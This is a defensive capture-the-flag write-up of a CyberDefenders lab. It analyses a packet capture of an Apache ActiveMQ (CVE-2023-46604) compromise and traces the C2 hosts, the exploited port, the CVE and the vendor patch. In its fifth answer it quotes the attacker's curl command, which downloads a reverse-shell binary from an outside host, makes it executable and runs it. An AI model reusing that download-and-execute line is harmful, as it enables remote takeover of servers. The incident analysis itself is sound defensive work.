# OpenWire – PCAP Analysis (CyberDefenders)

## Scenario
During your shift as a tier-2 SOC analyst, you receive an escalation from a tier-1 analyst regarding a public-facing server. 
This server has been flagged for making outbound connections to multiple suspicious IPs. 
In response, you initiate the standard incident response protocol, which includes isolating the server from the network to prevent potential lateral movement or data exfiltration and obtaining a packet capture from the NSM utility for analysis.
Your task is to analyze the pcap and assess for signs of malicious activity.

## References
- https://cyberdefenders.org/blueteam-ctf-challenges/openwire/

### Q1 - By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?

First I used **Conversations** just to get a feel for the hosts and understand who was talking to whom.
Then I checked a few protocols like **HTTP** and **TLS** to see where the traffic looked more interesting.
After a few quick passes, `146.190.21.92` looked like the most likely answer, so I treated it as my working hypothesis.
And that ended up being correct.
Later on in the lab there were stronger confirmations anyway, so at this stage I was fine with using it as an initial answer rather than forcing a heavier verification immediately.

<img width="244" height="126" alt="immagine" src="https://github.com/user-attachments/assets/16a8ea61-9bcd-407d-8232-69059352eb11" />

**Answer:** `146.190.21.92`

### Q2 - Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?

Once I already had the attacker IP, I filtered on:
```text
ip.src == 146.190.21.92
```
From there I noticed the unusual **OpenWire** traffic, which stood out immediately compared to the rest.
That was enough to narrow the focus, because OpenWire is not something I would expect to ignore in this context.
Looking at the connection details, the relevant service was running on port `61616`, so that was the answer to the question.

<img width="1774" height="277" alt="immagine" src="https://github.com/user-attachments/assets/70cfc70f-a944-4460-95fe-e6c378b13139" />

**Answer:** `61616`

### Q3 - Following up on the previous question, what is the name of the service found to be vulnerable?

I followed the TCP stream on the packets tied to the OpenWire traffic, because once that protocol showed up it was the most obvious thing to dig into.
In the stream I could already see `ActiveMQ` in clear text, so at that point the answer was basically there.

<img width="1384" height="199" alt="immagine" src="https://github.com/user-attachments/assets/ee5a5487-0c5c-4131-b74a-d68461387a3b" />

I did not know off the top of my head what OpenWire was, so I quickly searched it and read just enough to confirm the link.
That made it straightforward to answer that the vulnerable service was **Apache ActiveMQ**.

<img width="679" height="134" alt="immagine" src="https://github.com/user-attachments/assets/b134cd02-47d4-480b-97bb-eea3bfb25d13" />

> [!NOTE]
> OpenWire is the native wire protocol used by Apache ActiveMQ for client-broker communication.
> In simpler terms, it is the format and set of rules ActiveMQ uses so systems can connect to the message broker, send messages, receive them, and exchange control information.

**Answer:** `Apache ActiveMQ`

### Q4 - The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?

From the Conversations view, the other suspicious external IP was already pretty obvious by exclusion, so this question felt a bit odd as written.
Still, instead of stopping at that guess, I used what I already knew and looked for something more concrete.

So I filtered on:
```text id="4kx28w"
ip.addr == 128.199.52.72
```
<img width="1539" height="335" alt="immagine" src="https://github.com/user-attachments/assets/4e0a1190-84b2-404e-96e8-63399c651ddc" />

That was enough to get a direct look at the traffic involving that host.
In the packets shown here, the compromised server is reaching out to `128.199.52.72` over HTTP and requesting `/docker`, with a `200 OK` coming back.
So even if the IP was already easy to suspect from the Conversations view, this gave me a more solid confirmation that `128.199.52.72` was the second C2-related host.


> [!NOTE]
> Docker is normally used to create and run containers, meaning isolated application environments packaged with everything they need to work.
> In simpler terms, it is often used to deploy software quickly and consistently without having to configure the whole system each time.

**Answer:** `128.199.52.72`

### Q5 - Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?

First I filtered for HTTP and then looked at the few relevant requests that stood out.
At that point the interesting part was not just the direct `GET /docker`, but the earlier `GET /invoice.xml`, because that looked like the exploit stage that was telling the server what to do next.

<img width="1678" height="230" alt="immagine" src="https://github.com/user-attachments/assets/2d89a766-e70a-45ca-9a58-b3954e0af480" />

So I followed the HTTP stream for `invoice.xml`.
Inside the XML you can clearly see the command being built and executed through `java.lang.ProcessBuilder`.
And there the important part is explicit: it runs `curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker`.

That was enough to answer the question, because the dropped reverse shell executable is the file being downloaded to disk and then executed,.

<img width="965" height="831" alt="immagine" src="https://github.com/user-attachments/assets/acf5c14d-db4f-41ef-8816-1982336a8baf" />

**Answer:** `docker`

### Q6 - What Java class was invoked by the XML file to run the exploit?

For this one there was not much to infer.
By just looking at the last screenshot, in the XML content you can see the `class` value set to `java.lang.ProcessBuilder`.

**Answer:** `java.lang.ProcessBuilder`

### Q7 - To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?

For this one I just searched on Google for `CVE Apache ActiveMQ shell` and took the most direct route.

The first result already pointed to **CVE-2023-46604**, and a quick read of the page was enough to confirm it matched what I had already seen in the traffic.
It lined up because the lab was clearly revolving around **ActiveMQ**, **OpenWire**, and a malicious XML-based exploit path, which is exactly the kind of issue described there.

<img width="619" height="273" alt="immagine" src="https://github.com/user-attachments/assets/7ca3a759-7dc2-4795-bf6f-28bdbd7980d7" />

**Answer:** `CVE-2023-46604`

### Q8 - The vendor addressed the vulnerability by adding a validation step to ensure that only valid Throwable classes can be instantiated, preventing exploitation. In which Java class and method was this validation step added?

For the last one I had more difficulty.
I first checked the official Apache update on **CVE-2023-46604** to confirm the vulnerability context, but that page mainly explains the OpenWire issue and the exploit path, not the exact patched class and method. ([activemq.apache.org][1])

[1]: https://activemq.apache.org/news/cve-2023-46604 "ActiveMQ"
[2]: https://www.uptycs.com/blog/threat-research-report-team/apache-activemq-cve-2023-46604 "CVE-2023-46604: How to Fix Apache ActiveMQ's Critical Vulnerability"

So I looked at patch-oriented references and the code itself.
Those sources point to the validation being added in `BaseDataStreamMarshaller.createThrowable`, where the patch inserts a check to make sure only valid `Throwable` classes can be instantiated. ([uptycs.com][2])

In simple terms, they put the check exactly at the point where the dangerous class creation was happening, so only valid `Throwable` classes are allowed and arbitrary classes are blocked.
**Answer:** `BaseDataStreamMarshaller.createThrowable`
